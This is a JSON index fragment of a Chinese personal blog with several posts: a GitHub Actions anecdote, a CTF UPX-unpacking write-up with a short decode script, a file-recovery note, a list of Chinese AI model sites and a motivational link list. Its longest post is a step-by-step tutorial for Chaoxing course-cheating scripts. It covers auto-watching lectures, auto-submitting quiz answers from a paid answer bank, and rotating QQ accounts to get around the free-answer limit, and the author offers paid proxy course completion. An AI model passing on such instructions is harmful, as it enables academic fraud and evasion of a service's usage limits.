来实现自动化执行脚本来更新，正好看到了探姬师傅的 Hello-CTF 的 Github 仓库里也用了 Github actions，就想着也试试。\n前前后后搞了十多天吧，在这期间，遇到了各种各样的奇奇怪怪的 bug，最终解决，能正常运行的时候，我欣喜若狂，我都不知道我有多高兴，从来没这么高兴过。\n结局虽然最后给社区分享了一下，社区维护人员给了我一种更好的解决办法，可以说是更加完美平替了，采用了他的方法，这十天也就是说白白浪费了\n其实也不能算白白浪费吧，毕竟对 Github actions 更加熟悉了一些，学到了一些东西，也算是对自己能力的一种考验吧。\n这份脚本我也留档了，有需要的可以参考一下，希望能帮到你。\n脚本及其教程脚本及其教程在这里：关于 Mkdocs-material 日期显示不准确的一种平替方法\n","categories":["技术教程","Github"],"tags":["Github","ChatGPT"]},{"title":"记一次不一样的UPX脱壳","url":"/posts/44452f5b.html","content":"记一次不一样的 UPX 脱壳前言今天早上打 LitCTF 的时候有个 hello_upx 题，一开始以为只是简单的工具脱壳，没想到 upx -d 没成功，报错 upx: hello_upx.exe: CantUnpackException: file is possibly modified/hacked/protected; take care!\n然后就搜了一下这个报错，找到了这篇文章：记一次没遇到过的 UPX 脱壳\n长知识了，原因是 UPX 加壳的文件被修改了，导致无法正常脱壳\n脱壳过程\n一开始脱壳失败，经过查资料发现解法\n拉进 winhex 发现文件被修改\n\n正常的文件应该是大写的UPX\n修改之后保存文件\n再用工具upx -d 脱壳即可\n\n解密\n分析可得，flag 就是 v4+i\nEXP:\nv4 = &quot;Lhr@PAup+cY%aXQe NZ\\x1E`N^Oe&quot;v5 = &quot;&quot;for i in range(0, 25):    v5 += chr(ord(v4[i]) + i)print(v5)\n","categories":["CTF","Reverse"],"tags":["CTF","逆向工程","UPX","脱壳"]},{"title":"记录一次文件恢复","url":"/posts/bd3810d9.html","content":"今天晚上刷 Python 题的时候突然想找出视频来看看，打开硬盘发现找不到文件在哪， 忘记放哪里去了\n拿出 everything 搜一下，发现全进了一个名为 found.000 的文件夹，直接打开显示拒绝访问，那就是权限不够呗，准备提权\n\n我也不知道文件为什么被塞进隐藏文件夹了，既然直接访问没权限。首先试一下能不能把隐藏目录给整出来\n浏览器里看一下是可以看到存在三个隐藏文件夹的，至于另外三个，也是被隐藏了，但我还没察觉到，不知道是什么文件\n\n看一下三个文件的修改日期\n| [found.000/]() |      | 2024/1/18 20: 09: 12 || [found.001/]() |      | 2024/1/23 15: 53: 30 || [found.002/]() |      | 2024/1/24 12: 56: 30 |\n\n看来不是同一次出现的。\n直接进看不到任何文件，浏览器的权限也不够\n\nbing 查一下用 bash 应该可以\nbash 带管理员模式启动，看了一下可以扫到隐藏文件夹\n\n先把文件复制出来再说\ncp found.000  recovery -r\n\n关于 Linux 的 cp 命令\nhttps://www.runoob.com/linux/linux-comm-cp.html#/\n文件应该是都拿出来了，把原来的文件夹删掉就行了。\n、\n搜了一下为什么会生成这些文件\n\n还好不是碎片化文件，看来物理存储介质也不是万无一失的\n所以到底是为什么数据会产生这些情况\n我想起来前几天电脑会突然响设备断连的警报声，可能是我的拓展坞不太行，但是绿联的问题应该不大吧。以后直接在电脑 TypeC 口插着吧，拓展坞不能用来数据传输，不太安全。\n最后把那些文件复制出来，看了一下也没啥用，先留着\n直接 rm -rf 把隐藏的文件给删掉了，省的占用空间\n\n最后也是虚惊一场，50个G的文件差点没了\n\n","categories":["Windows"],"tags":["Windows","应急响应","文件恢复"]},{"title":"超星学习通/刷课脚本安装教程","url":"/posts/12c45bcf.html","content":"\n新的刷课脚本已更新，强烈建议用新的，并把本脚本结合使用，效果最佳，传送门：https://blog.w1ndys.top/posts/1ff200e1\n\n\n前言：使用本工具请自觉遵守国家法律法规，下载后请 24 小时之内删除，本教程来自 www.w1ndys.top\n 使用  本教程即代表用户同意本教程 用户协议，使用本教程造成的  一切后果由个人承担 ， 作者   概不负责 \n 请注意：本教程所涉新的本工具开发者并不是博主本人，内涵涉及收费的内容，请酌情考虑 \n本教程编写于 2023 年 11 月 3 日，距离时间过长可能脚本已失效，请铭记\n本教程旨在节省大家时间，让大家去做更有意义的事情，请勿用于违法用途，请勿倒卖，否则将追究法律责任\n\n本教程编写耗时  160 分钟  且浏览完全免费，且看且珍惜\n\n\n 更新：如果本文章使用次数耗尽而且不想买，又或者也有知到智慧树相关需求， 可以移步 智慧树&#x2F;知到&#x2F;刷课脚本安装教程，可继续获得 100 次免费答题\n\n\n作者建议建议在阳间的时间刷课，后台可以看到浏览时间的\n工具准备\n一台能上网的电脑\n\nGoogle Chrome（推荐）\n没有 Google 的可以用 Windows 自带的 Edge 浏览器（\n\n脚本猫（用篡改猴也行，本教程以脚本猫为例\n详情：脚本猫使用文档\n\n一个魔法工具（梯子）\n 需要特别注意的是，使用本工具有一定的流量计费，3.8-38.8 不等，根据自己需要选择 ，此费用也不是我本人收取，而是流量的提供方收取，特别注意这点  如果你介意此费用，你可以关闭此页面退出阅读了。  如果你自己有梯子可以忽略这一步  具体注意事项下面会提到\n\nOCS 客户端\n\n一个懂的百度的大脑（不是\n\n一双灵敏的眼睛（不是\n\n一个耐心看教程的好习惯（不是\n\n一颗真诚的心和  良好的态度 ，有问题 联系博主\n（实在懒得弄可以找我低价代刷\n\n\n开始操作有了这个工具，你不只是能进 ai，还可以高速浏览 GitHub 等网站，以及…………\n爬墙工具的介绍和安装使用 如果你自己有梯子可以忽略这一步 \n 如果你自己有梯子可以忽略这一步 \n 如果你自己有梯子可以忽略这一步 \n 如果你自己有梯子可以忽略这一步 \n有了这个工具，你不只是能进 ai，还可以高速浏览 GitHub 等网站，以及…………\n工具介绍 这些你都不需要记，看看就行 \n​        虚拟专用网络(Virtual Private Network，VPN)是专用网络的延伸，它包含了类似 Internet 的共享或公共网络链接。通过 VPN 可以以模拟点对点专用链接的方式通过共享或公共网络在两台计算机之间发送数据。\n　　如果说得再通俗一点，VPN 实际上是 “线路中的线路”，类型于城市大道上的 “公交专用线”，所不同的是，由 VPN 组成的 “线路” 并不是物理存在的，而是通过技术手段模拟出来，即是 “虚拟” 的。不过，这种虚拟的专用网络技术却可以在一条公用线路中为两台计算机建立一个逻辑上的专用 “通道”，它具有良好的保密和不受干扰性，使双方能进行自由而安全的点对点连接，因此被网络管理员们非常广泛地关注着。\n　　通过虚拟专用网，我们在家就可以轻松安全的登录到公司的内部网络上，这样可以实现我们在家办公的梦想了。\n账号注册微信搜索公众号关注：  W1ndys_Official  点击下方菜单 GPT 可获取注册地址\n\n输入邮箱密码注册账号，注册完成后登陆\n\n然后点击左侧购买订阅\n\n根据需求选择你合适的方案，如果你只是想尝鲜的话，毫无疑问，选最便宜的，能用就行\n\n我本人用的是  38.8 巨量不限时，推荐这个 ，大约可以用 2 年左右，平均下来大约 0.6&#x2F;天\n\n因为我不只有这一个需求，另外还有使用  ChatGPT，bingai  等的需求，所以这个是最划算的。\n\n另外关于如何使用 ChatGPT 的教程以后有时间我会写，OpenAI 官方的 ChatGPT\n买完之后点击左上方仪表盘可以看到你的已订阅\n\n然后点击仪表盘下方的使用文档\n\n选择你的系统安装客户端\n安装完之后登陆客户端就可以看到这样\n\n连接节点目前为止已经基本结束了，点击连接，点进去选个绿色的节点，点全局， 如果后续出现连接失败就换个节点 \n\n脚本安装首先安装脚本猫，点击进入 脚本猫使用文档\n\n根据自己浏览器选择安装，这里以 Google Chrome 为例\n（如果长时间进不去则需要  科学上网 ，由于种种原因这里不过多赘述）\n\n进来之后点击图示右上角安装（由于我已经安装过了所以图示是 remove）\n\n然后进入浏览器扩展中心可以看到已经安装好了，启用该扩展\n然后点击获取脚本 超星学习通脚本猫脚本\n\n\n由于我已经安装完了，这里显示的是重新安装和更新\n至此脚本已经安装完毕\n脚本配置接下来就是开始配置脚本\n点击进入 超星学习通官网\n登录账号进入个人空间\n\n点击对应课程\n\n点击确定跳转到脚本页面\n\n\n首先任务设置全选就行\n自动提交也点\n题库 token 需要绑定 QQ\n注意 ↓\n一个 QQ 只能绑定一个账号\n绑定成功可以获得答题次数赠送\n如果 QQ 之前绑定过其他 token，绑定会失败，一个 QQ 只能绑定一个账号\n绑定成功可以获得答题次数赠送\n如果 QQ 之前绑定过其他 token，绑定会失败\n\n\n视频倍速自己酌情考虑\n正确率 0-100\n点击保存\n总开关默认是只看一集，闯关模式是连续刷，适合挂着不管\n点击任意开关即可开刷\n\n\n在这里提一嘴，有关于脚本收费问题，QQ 号绑定会赠送 100 次答题次数\n答题次数的收费标准是 1 元&#x2F;200 题，5 元&#x2F;2000 题，10&#x2F;元 5000 题\n有个纯白嫖的方法就是换 QQ 号绑定，官方的说法是每个 QQ 只能绑定一个 token，但没说每个 token 只能用一个 QQ 绑定\n 此收费项目与本人无关，酌情消费 \n token 不要泄露！！token 不要泄露！！token 不要泄露！！ 重要的事情说三遍\n\n结束至此已经基本结束了\n展示放一下我自己的刷课记录\n\n\n\n用户协议\n使用本教程即代表同意此用户协议\n使用本教程所带来的后果均由用户个人承担\n本教程所涉及的消费均与本人无关\n本教程未经本人允许禁止转载\n不要跟我杠，杠就是你对\n我本人有 抑郁症 病史，玩过小红书，若本人遭受任何形式的网络暴力 (包括但不限于发送淫 &#x2F; 秽血 &#x2F; 腥图片，问候我家人), 并出现极端行为。一切都是 本人的错 和大家无关\n本教程旨在节省大家时间，让大家去做更有意义的事情，请勿用于违法用途，请勿倒卖，否则将追究法律责任\n 博主 W1ndys 享有最终解释权 \n\n","categories":["技术教程"],"tags":["线上课答案库","超星学习通","刷课脚本"]},{"title":"适合个体用户使用的国内AI大模型","url":"/posts/75294ae4.html","content":"智谱 AI（GLM 大模型）智谱 AI（GLM 大模型） http://chatglm.cn\n阿里通义千问阿里通义千问： http://qianwen.aliyun.com\n百川智能（百川大模型）百川智能（百川大模型） http://www.baichuan-ai.com\n讯飞星火讯飞星火： http://xinghuo.xfyun.cn\n360 智脑360 智脑 ： http://ai.360.cn\n个人感觉，并不是传统意义上的 AI，而是一个自动化搜索引擎\n天工 AI天工 AI： http://search.tiangong.cn\n中科院（紫东太初大模型）中科院（紫东太初大模型）http://xihe.mindspore.cn\n百度（文心一言）百度（文心一言） https://yiyan.baidu.com/#/\n字节（云雀大模型）字节（云雀大模型） http://www.doubao.com\n上海人工智能实验室（书生通用大模型）上海人工智能实验室（书生通用大模型） http://intern-ai.org.cn\nMiniMax（ABAB 大模型）MiniMax（ABAB 大模型） https://api.minimax.chat\n","categories":["AI","ChatGPT","人工智能"],"tags":["ChatGPT","AI","人工智能"]},{"title":"那些激励我的文章","url":"/posts/9099d312.html","content":"那些激励我的文章今天在刷盛师傅的博客，有这么一篇文章激励了我，看到了他 2023 复盘，各种比赛各种奖项，膜拜大佬，激励自己前进。\n决定写个收集文章，收集曾经激励过我的，希望我以后也能成为别人的动力。\n\nh3110w0r1d’s Blog——2023 复盘\n\n阿秀的学习笔记\n\n\n","categories":["随笔","Power"],"tags":["随笔","Power","激励","前进的动力","膜拜大佬"]}]